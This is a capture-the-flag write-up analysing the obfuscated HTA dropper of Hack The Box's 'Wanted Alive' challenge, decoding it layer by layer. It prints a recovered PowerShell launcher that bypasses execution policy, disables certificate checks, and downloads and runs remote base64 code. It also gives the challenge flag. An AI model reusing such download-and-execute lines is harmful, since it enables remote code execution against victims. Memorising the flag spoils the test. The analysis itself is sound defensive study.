<img width="702" height="634" alt="image" src="https://github.com/user-attachments/assets/f6460be0-2a72-449e-9b65-cc28bf6c2eeb" />

# HTB — *Wanted Alive* — full write-up

## Summary (TL;DR)

You were given `Wanted Alive.zip` containing `wanted.hta` and a target host `94.237.122.216:45034`. The HTA contained heavily nested, URL-encoded JavaScript/VBScript that ultimately built and base64-decoded a PowerShell launcher which downloaded a remote payload from `http://wanted.alive.htb/cdba/_rp`. Fetching that remote resource (via the challenge IP/port) revealed the flag:

**Flag:** `HTB{c4tch3d_th3_m4lw4r3_w1th_th3_l4ss0_l1k3_1t_w4s_n0th1nG}`

Below are the steps you followed, the key commands, why they work, and a detailed explanation of the obfuscation and how the payload executes (if run). I include safe analysis commands only — nothing executed on your system beyond read/inspect operations.

---

# 1. Initial reconnaissance (files + service)

- File delivered: `Wanted Alive.zip` → contains `wanted.hta`.
- Service on host: port `45034/tcp` running `Werkzeug httpd 3.1.3 (Python 3.13.2)` (nmap `sV -Pn -p 45034 94.237.122.216`).

Why important:

- `hta` files are HTML Application files for Windows — they can contain VBScript / JScript and often drop/run payloads.
- The target port was HTTP-like, so final payloads were likely hosted on that port.

---

# 2. Inspect `wanted.hta` safely

Goal: don’t execute anything; inspect for obfuscation.

Example commands you used:

```bash
file wanted.hta
head -c 2000 wanted.hta | sed -n '1,120p'       # peek a portion
tail -c 2000 wanted.hta | sed -n '1,120p'       # peek end
fold -w 200 wanted.hta > wanted.folded.hta      # make it readable
```

What you saw:

- `wanted.hta` contained many nested `document.write(unescape(...))` constructs and a variable like `m='...'; d=unescape(m); document.write(d);`.
- Long single-line, heavy percent-encoding (`%25`, `%3C`, etc.) — typical of repeated URL encoding and nested `unescape()`.

Why that matters:

- Authors often nest `unescape()` / percent-encoding to hide the real script. Repeated `unescape`/URL decode operations will eventually reveal VBScript or PowerShell code.

---

# 3. Extract the main encoded blob for iterative decoding

You extracted the `m='...'` string and iteratively URL-decoded it until stable (no more `%` signs / changes).

Commands (what you ran):

```bash
# extract the m='...' string into m1.txt:
perl -0777 -ne "print \$1 if /m='([^']+)'\\s*;d=unescape\\(m\\)/s" wanted.hta > m1.txt

# iterative URL decode in Python to decode nested percent encoding
python3 - <<'PY'
import urllib.parse
s=open('m1.txt','rb').read().decode('latin1',errors='ignore')
i=0
while True:
    t=urllib.parse.unquote(s)
    open(f'm.decoded.{i}.txt','w',encoding='latin1').write(s)
    print(f'iter {i}: len={len(s)} percent_signs={s.count("%")}')
    if t==s:
        open('m.decoded.final.txt','w',encoding='latin1').write(s)
        break
    s=t; i+=1
PY
```

What happened:

- Several iterations of URL decoding decreased percent-encoding and revealed a VBScript/HTML body in `m.decoded.final.txt`, then `m.decoded.final2.txt`.
- The final decoded blob contained a VBScript dropper with many embedded base64 fragments and strings like `createObject("SCRIPT.shell")`, `PowErShEll -Ex BYPaSS`, `FromBase64String`, and `URLDownloadToFile`.

Why this step is crucial:

- Repeated URL decoding is a reliable way to unwind nested `unescape` obfuscation without executing code. Save each iteration to inspect how it evolves.

---

# 4. Find base64 / PowerShell fragments

You searched for base64 or indicators like `FromBase64String`, `Set-ExecutionPolicy`, `DownloadString`, `URLDownloadToFile` etc., because these often indicate the real payload.

Key command:

```bash
grep -nE "unescape\(|FromBase64String|Set-ExecutionPolicy|DownloadString|URLDownloadToFile|PowErSh|FromBase64" m.decoded.final.txt
```

You created `b64_candidates.txt` with several long fragments found and decoded them. One candidate (`b64_000`) decoded to a PowerShell dropper using `URLDownloadToFile` or `.DownloadString('http://wanted.alive.htb/35/wanted.tIF')`.

You decoded repeated percent encoded blocks and then isolated multiple base64-like strings.

---

# 5. Decode the base64/UTF-16LE PowerShell fragment safely

Observation: Many Windows PowerShell payloads are encoded as UTF-16LE and then base64 encoded (or base64 of UTF-16 bytes). `strings` showed `Set-ExecutionPolicy Bypass -Scope Process -Force` which confirmed a PowerShell launcher.

You used a safe decode pattern:

- If the candidate looked like base64, decode it and try interpreting as:
    - utf-8 (text),
    - utf-16le (PowerShell often),
    - and run `strings` to view ASCII sequences.

Example decoding flow (what you did or would do):

```bash
# identify candidate (b64_000 was interesting)
echo '...long_base64...' > candidate.b64
base64 -d candidate.b64 > candidate.bin
file candidate.bin
strings candidate.bin | head -n 40
iconv -f utf-16le -t utf-8 candidate.bin > candidate.ps1 2>/dev/null || true
head -n 40 candidate.ps1
```

You found that the decoded PowerShell included a call to:

```
(new-object system.net.webclient).downloadstring('http://wanted.alive.htb/35/wanted.tIF')
```

wrapped in `FromBase64String(...).GetString(...)` → so it was a base64 representation of a further payload, or directly `DownloadString('http://wanted.alive.htb/35/wanted.tIF')`.

---

# 6. Resolve the fake domain to the challenge server and fetch the remote payload (read-only)

Since `wanted.alive.htb` is a challenge domain, you either:

- temporarily add an `/etc/hosts` entry:
    
    ```bash
    echo "94.237.122.216 wanted.alive.htb" | sudo tee -a /etc/hosts
    ```
    
    then `curl http://wanted.alive.htb:45034/35/wanted.tIF -o wanted.tIF`
    
    — or safer without touching hosts, substitute the host and port directly:
    
    ```bash
    curl -v "http://94.237.122.216:45034/35/wanted.tIF" -o wanted.tIF
    ```
    

You fetched `wanted.tIF` and verified it, using:

```bash
file wanted.tIF
strings wanted.tIF | head -n 40
```

`file` reported `ASCII text` and `strings` showed a VBScript dropper again (lots of functions, plus a variable `latifoliado` containing many base64 fragments). So `wanted.tIF` was not an image despite `.tIF` extension — the server set `Content-Type: image/tiff` to obfuscate.

---

# 7. Decode the `latifoliado` block (the big concatenated base64)

Inside the downloaded VBScript (`remote_payload.bin` / `wanted.tIF`), there was a variable `latifoliado` built piece-by-piece via concatenations:

Example fragments:

```
latifoliado = "U2V0LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLVNjb3BlIFByb2Nlc3MgLUZvcmNlOyBbU3lzdGVtLk5ldC5T..."
latifoliado = latifoliado & "XN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJd..."
...
Dim parrana
parrana = "d2FudGVkCg"
...
arran = arran & "d2FudGVkCg" & latifoliado & "d2FudGVkCg"

```

Notable points:

- `parrana` variable contained `d2FudGVkCg` which decodes to `wanted\n` — that string was used as a *noise marker* inserted repeatedly to make the base64 stream non-contiguous visually.
- The payload concatenated many quoted pieces to form a large base64 string, but interleaved `parrana` fragments as padding/noise.

You extracted and decoded `latifoliado` by:

1. Grep the lines that assign/concatenate `latifoliado`.
2. Extract the quoted pieces in order and join them into one long string.
3. Remove every `d2FudGVkCg` substring.
4. Base64-decode the cleaned string.

Commands (what you executed):

```bash
# extract snippet
awk 'BEGIN{p=0} /latifoliado\s*=/ {p=1} p{print} /Dim parrana/{exit}' wanted.tIF > latifoliado.snip.txt

# extract quoted pieces & join
grep -oP '"[^"]*"' latifoliado.snip.txt | sed 's/"//g' > latifoliado.pieces.txt
tr -d '\n' < latifoliado.pieces.txt > latifoliado.joined.b64

# remove "parrana" noise (d2FudGVkCg)
sed 's/d2FudGVkCg//g' latifoliado.joined.b64 > latifoliado.clean.b64

# base64 decode
base64 -d latifoliado.clean.b64 > latifoliado.dec.bin
```

You then attempted common decodings:

```bash
iconv -f utf-16le -t utf-8 latifoliado.dec.bin > latifoliado.dec.utf16.txt 2>/dev/null || true
iconv -f utf-8 -t utf-8    latifoliado.dec.bin > latifoliado.dec.utf8.txt 2>/dev/null || true
strings latifoliado.dec.bin | sed -n '1,200p'
```

Result:

- `latifoliado.dec.utf8.txt` head contained the line:
    
    ```
    Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((new-object system.net.webclient).downloadstring('http://wanted.alive.htb/cdba/_rp'))))
    
    ```
    
- That gave the final URL path: `/cdba/_rp` on domain `wanted.alive.htb`.

---

# 8. Fetch the final URL and retrieve the flag

You then fetched:

```bash
curl -sv "http://94.237.122.216:45034/cdba/_rp" -o final_payload.bin
file final_payload.bin
strings final_payload.bin | head -n 120

```

That final resource returned the flag text:

```
HTB{c4tch3d_th3_m4lw4r3_w1th_th3_l4ss0_l1k3_1t_w4s_n0th1nG}
```

<img width="1389" height="130" alt="image" src="https://github.com/user-attachments/assets/c91509af-3fd6-4167-9893-78f6eb960d83" />

thats our flag
